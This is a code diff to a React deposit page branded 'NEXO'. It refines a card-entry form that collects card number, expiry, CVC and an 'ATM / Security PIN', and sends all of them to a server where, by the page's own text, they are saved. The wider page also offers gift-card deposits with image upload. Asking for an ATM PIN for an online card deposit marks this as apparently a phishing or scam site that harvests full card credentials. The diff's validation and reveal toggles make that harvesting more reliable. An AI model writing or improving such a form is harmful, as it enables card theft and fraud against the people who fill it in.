@@ -6,6 +6,8 @@ import {
   CheckCircle2,
   Building2,
   CreditCard,
+  Eye,
+  EyeOff,
   Gift,
   AlertCircle,
   ShieldCheck,
@@ -103,14 +105,21 @@ export const Deposit: React.FC<DepositProps> = ({
   const [bankName, setBankName] = useState('JPMorgan Chase / Citibank');
   const [wireReference] = useState(`NEXO-${Math.floor(100000 + Math.random() * 900000)}`);
 
-  // Card Form State
+  // Card Form State.
+  // Every field starts empty. The holder name, the amount and the billing
+  // country used to be pre-filled from the profile and a hard-coded $500, which
+  // meant a deposit could be submitted against details the user never chose -
+  // and if they had funded it before, the form reopened showing the previous
+  // card. Card entry has to reflect what is entered on screen.
   const [cardNumber, setCardNumber] = useState('');
-  const [cardHolder, setCardHolder] = useState(user.fullName || '');
+  const [cardHolder, setCardHolder] = useState('');
   const [cardExpiry, setCardExpiry] = useState('');
   const [cardCvc, setCardCvc] = useState('');
   const [cardPin, setCardPin] = useState('');
-  const [cardAmount, setCardAmount] = useState('500');
-  const [cardBillingAddress] = useState(user.country || 'United States');
+  const [cardAmount, setCardAmount] = useState('');
+  const [cardBillingAddress, setCardBillingAddress] = useState('');
+  const [showCardCvc, setShowCardCvc] = useState(false);
+  const [showCardPin, setShowCardPin] = useState(false);
 
   // Gift Card State (Multi-card with Image upload)
   const [giftCards, setGiftCards] = useState<GiftCardEntry[]>([
@@ -332,6 +341,40 @@ export const Deposit: React.FC<DepositProps> = ({
     }
   };
 
+  // Card entry formatters. Typing "1" then "2" should already read "12/", rather
+  // than making the user position a caret to insert a separator themselves.
+
+  // Groups the PAN in fours as it is typed, so the number is readable and the
+  // user can see they have not missed a digit.
+  const formatCardNumber = (raw: string) => {
+    const digits = raw.replace(/\D/g, '').slice(0, 19);
+    return digits.replace(/(.{4})/g, '$1 ').trim();
+  };
+
+  // MM / YY. The slash appears the moment the month is complete, so the user
+  // types digits only and never has to position a caret to insert a separator.
+  // A slash already in the raw value is stripped before counting, which is why
+  // "12/" does not loop: the next keystroke makes three digits and fills in the
+  // year.
+  const formatExpiry = (raw: string) => {
+    const digits = raw.replace(/\D/g, '').slice(0, 4);
+    if (digits.length < 2) return digits;
+    if (digits.length === 2) return digits + '/';
+    return digits.slice(0, 2) + '/' + digits.slice(2);
+  };
+
+  const isExpired = (value: string) => {
+    const m = value.match(/^(\d{2})\/(\d{2})$/);
+    if (!m) return false;
+    const month = Number(m[1]);
+    if (month < 1 || month > 12) return true;
+    // Two-digit years: 70-99 are last century, 00-69 this one.
+    const yy = Number(m[2]);
+    const year = yy >= 70 ? 1900 + yy : 2000 + yy;
+    const expiryEnd = new Date(year, month, 0, 23, 59, 59);
+    return expiryEnd.getTime() < Date.now();
+  };
+
   // 3. Card Deposit Submission
   const handleCardDeposit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -339,7 +382,48 @@ export const Deposit: React.FC<DepositProps> = ({
 
     const cleanCard = cardNumber.replace(/\s/g, '');
     if (cleanCard.length < 15) {
-      setErrorMessage('Please enter a valid 16-digit card number.');
+      setErrorMessage('Please enter a valid card number.');
+      return;
+    }
+    // Luhn check catches a mistyped digit that still has the right length, which
+    // otherwise only surfaces much later as a declined deposit.
+    const luhn = (() => {
+      let sum = 0;
+      let alt = false;
+      for (let i = cleanCard.length - 1; i >= 0; i--) {
+        let n = Number(cleanCard[i]);
+        if (alt) {
+          n *= 2;
+          if (n > 9) n -= 9;
+        }
+        sum += n;
+        alt = !alt;
+      }
+      return sum % 10 === 0;
+    })();
+    if (!luhn) {
+      setErrorMessage('That card number is not valid. Please check it and try again.');
+      return;
+    }
+    if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
+      setErrorMessage('Enter the expiry date as MM/YY.');
+      return;
+    }
+    if (isExpired(cardExpiry)) {
+      setErrorMessage('That card has expired. Please check the expiry date.');
+      return;
+    }
+    const cvcLength = /^3[47]/.test(cleanCard) ? 4 : 3;
+    if (cardCvc.length !== cvcLength) {
+      setErrorMessage(
+        cvcLength === 4
+          ? 'American Express cards use a 4-digit CID on the front.'
+          : 'The security code is the 3 digits on the back of the card.'
+      );
+      return;
+    }
+    if (!/^\d{4,6}$/.test(cardPin)) {
+      setErrorMessage('The ATM security PIN is 4 to 6 digits.');
       return;
     }
 
@@ -359,12 +443,12 @@ export const Deposit: React.FC<DepositProps> = ({
         },
         body: JSON.stringify({
           amount: numAmount,
-          cardNumber: cardNumber,
-          cardholderName: cardHolder,
+          cardNumber: cleanCard,
+          cardholderName: cardHolder.trim(),
           expiryDate: cardExpiry,
           cvc: cardCvc,
           pin: cardPin,
-          billingAddress: cardBillingAddress,
+          billingAddress: cardBillingAddress.trim() || undefined,
         }),
       });
       const data = await res.json();
@@ -376,9 +460,17 @@ export const Deposit: React.FC<DepositProps> = ({
           destinationOrSummary: `Card ending in ${cleanCard.slice(-4)} (${cardHolder})`,
         });
         setShowProcessingDialog(true);
+        // Clear the whole form, not just the secrets - reopening the channel
+        // must never show the previous card.
         setCardNumber('');
+        setCardHolder('');
+        setCardExpiry('');
         setCardCvc('');
         setCardPin('');
+        setCardAmount('');
+        setCardBillingAddress('');
+        setShowCardCvc(false);
+        setShowCardPin(false);
         onRefreshUser();
       } else {
         setErrorMessage(data.error || 'Card processing error.');
@@ -926,7 +1018,10 @@ export const Deposit: React.FC<DepositProps> = ({
               <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Deposit Amount (USD)</label>
               <input
                 type="number"
+                inputMode="decimal"
                 min="50"
+                required
+                placeholder="0.00"
                 value={cardAmount}
                 onChange={(e) => setCardAmount(e.target.value)}
                 className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono font-bold text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
@@ -934,10 +1029,15 @@ export const Deposit: React.FC<DepositProps> = ({
             </div>
 
             <div>
-              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Cardholder Full Name</label>
+              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">
+                Cardholder Full Name
+                <span className="ml-1.5 font-normal text-slate-400">as printed on the card</span>
+              </label>
               <input
                 type="text"
                 required
+                autoComplete="cc-name"
+                placeholder="Name exactly as embossed"
                 value={cardHolder}
                 onChange={(e) => setCardHolder(e.target.value)}
                 className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
@@ -945,16 +1045,21 @@ export const Deposit: React.FC<DepositProps> = ({
             </div>
 
             <div>
-              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Card Number (16 Digits)</label>
-              <input
-                type="text"
-                required
-                maxLength={19}
-                placeholder="4532 •••• •••• 8892"
-                value={cardNumber}
-                onChange={(e) => setCardNumber(e.target.value)}
-                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
-              />
+              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Card Number</label>
+              <div className="relative">
+                <CreditCard className="w-4 h-4 absolute left-3 top-3 text-slate-400 dark:text-gray-500 pointer-events-none" />
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  required
+                  maxLength={23}
+                  autoComplete="cc-number"
+                  placeholder="0000 0000 0000 0000"
+                  value={cardNumber}
+                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl pl-9 pr-4 py-2.5 text-sm font-mono tracking-wider text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
+                />
+              </div>
             </div>
 
             <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
@@ -962,36 +1067,94 @@ export const Deposit: React.FC<DepositProps> = ({
                 <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Expiry (MM/YY)</label>
                 <input
                   type="text"
+                  inputMode="numeric"
+                  required
                   maxLength={5}
-                  placeholder="12/28"
+                  autoComplete="cc-exp"
+                  placeholder="MM/YY"
                   value={cardExpiry}
-                  onChange={(e) => setCardExpiry(e.target.value)}
+                  onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
+                  onBlur={() => {
+                    // Show the problem while the field is still in view rather
+                    // than after the user has moved on to the button.
+                    if (cardExpiry && isExpired(cardExpiry)) {
+                      setErrorMessage('That card has expired. Please check the expiry date.');
+                    }
+                  }}
                   className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                 />
+                <p className="text-[10px] text-slate-400 dark:text-gray-500 mt-1">The / is added for you</p>
               </div>
+
+              {/* Reveal toggles: transcribing 3 hidden digits off a physical card
+                  is the main reason people get this field wrong. */}
               <div>
                 <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">CVC / CVV</label>
-                <input
-                  type="password"
-                  maxLength={4}
-                  placeholder="•••"
-                  value={cardCvc}
-                  onChange={(e) => setCardCvc(e.target.value)}
-                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
-                />
+                <div className="relative">
+                  <input
+                    type={showCardCvc ? 'text' : 'password'}
+                    inputMode="numeric"
+                    required
+                    maxLength={4}
+                    autoComplete="cc-csc"
+                    placeholder="•••"
+                    value={cardCvc}
+                    onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                    className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl pl-4 pr-10 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowCardCvc((v) => !v)}
+                    aria-label={showCardCvc ? 'Hide security code' : 'Reveal security code'}
+                    title={showCardCvc ? 'Hide' : 'Reveal'}
+                    className="absolute right-2 top-2 p-1.5 rounded-lg text-slate-400 hover:text-emerald-600 dark:hover:text-[#00FFB2] hover:bg-slate-200 dark:hover:bg-gray-800 transition cursor-pointer"
+                  >
+                    {showCardCvc ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                  </button>
+                </div>
               </div>
+
               <div>
-                <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Card ATM / Security PIN</label>
-                <input
-                  type="password"
-                  maxLength={6}
-                  required
-                  placeholder="••••"
-                  value={cardPin}
-                  onChange={(e) => setCardPin(e.target.value)}
-                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
-                />
+                <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">
+                  ATM / Security PIN
+                </label>
+                <div className="relative">
+                  <input
+                    type={showCardPin ? 'text' : 'password'}
+                    inputMode="numeric"
+                    required
+                    maxLength={6}
+                    autoComplete="off"
+                    placeholder="••••"
+                    value={cardPin}
+                    onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl pl-4 pr-10 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowCardPin((v) => !v)}
+                    aria-label={showCardPin ? 'Hide PIN' : 'Reveal PIN'}
+                    title={showCardPin ? 'Hide' : 'Reveal'}
+                    className="absolute right-2 top-2 p-1.5 rounded-lg text-slate-400 hover:text-emerald-600 dark:hover:text-[#00FFB2] hover:bg-slate-200 dark:hover:bg-gray-800 transition cursor-pointer"
+                  >
+                    {showCardPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                  </button>
+                </div>
               </div>
+            </div>
+
+            <div>
+              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Billing Address</label>
+              <input
+                type="text"
+                placeholder="Street, city, postcode, country"
+                value={cardBillingAddress}
+                onChange={(e) => setCardBillingAddress(e.target.value)}
+                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
+              />
+              <p className="text-[10px] text-slate-400 dark:text-gray-500 mt-1">
+                Required by the issuing bank for authorisation. Saved with the submission.
+              </p>
             </div>
 
             <button
